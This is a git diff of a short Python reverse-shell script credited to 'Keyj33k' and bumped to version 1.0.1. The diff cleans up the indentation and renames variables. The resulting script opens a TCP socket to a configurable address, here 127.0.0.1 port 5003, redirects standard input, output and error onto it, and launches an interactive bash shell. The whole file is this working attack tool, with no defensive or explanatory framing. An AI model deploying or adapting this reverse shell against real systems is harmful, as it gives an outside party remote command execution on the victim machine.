@@ -1,5 +1,8 @@
 #!/usr/bin/env python3
 
+from subprocess import run
+import os 
+
 # # # # # # # # # # # # # # # # # # # # # #
 #                                         #
 #   Author  :   Keyj33k                   #
@@ -7,30 +10,26 @@
 #   Twitter :   @keyjeek                  #
 #   Github  :   @keyj33k                  #
 #   Insta   :   @keyjeek                  #
-#   Version :   1.0.0                     #
+#   Version :   1.0.1                     #
 #                                         #
 # # # # # # # # # # # # # # # # # # # # # # 
 
-from subprocess import run
-import os 
-
 class shell:
         
-    def __init__(self, TARGET_IPADDRESS, TARGET_PORT):
-         self.TARGET_IPADDRESS = TARGET_IPADDRESS
-            self.TARGET_PORT = TARGET_PORT
+    def __init__(self, target_address, target_port):
+        self.target_address = target_address
+        self.target_port = target_port
             
-    REVERSE_CONNECTION = shell("127.0.0.1", int(5003))
-    from os import dup2
-    import socket
-    
-    os.system('clear')
-    # Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
-    SOCKET_SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    SOCKET_SOCK.connect((REVERSE_CONNECTION.TARGET_IPADDRESS, REVERSE_CONNECTION.TARGET_PORT))
+reverse_connection = shell("127.0.0.1", int(5003))
+from os import dup2
+import socket
+os.system('clear')
 
-    dup2(SOCKET_SOCK.fileno(),0)
-    dup2(SOCKET_SOCK.fileno(),1)
-    dup2(SOCKET_SOCK.fileno(),2)
-    run(["/bin/bash","-i"])   
+# Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
+socket_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+socket_sock.connect((reverse_connection.target_address, reverse_connection.target_port))
     
+dup2(socket_sock.fileno(),0)
+dup2(socket_sock.fileno(),1)
+dup2(socket_sock.fileno(),2)
+run(["/bin/bash","-i"]) 
